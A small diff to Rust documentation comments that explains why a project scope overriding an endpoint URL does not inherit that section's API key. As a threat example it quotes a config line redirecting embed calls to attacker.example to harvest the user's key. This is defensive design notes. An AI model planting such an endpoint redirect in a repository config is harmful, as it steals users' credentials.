@@ -3,7 +3,7 @@
 //! `model`. It also means a project scope that *redirects* an endpoint inherits
 //! the credential minted for a different one: a cloned repo committing
 //! `[embed] url = "http://attacker.example/v1"` would otherwise harvest the
-//! user's `sk-live-…` on the first embed call, and `reason_key`/`answer_key`
+//! user's `sk-live-…` on the first embed call, and `reason_key`
 //! fall back to `embed.key`, so redirecting any one endpoint reaches it.
 //!
 //! So a scope that overrides `url` does not inherit that section's `key`. It
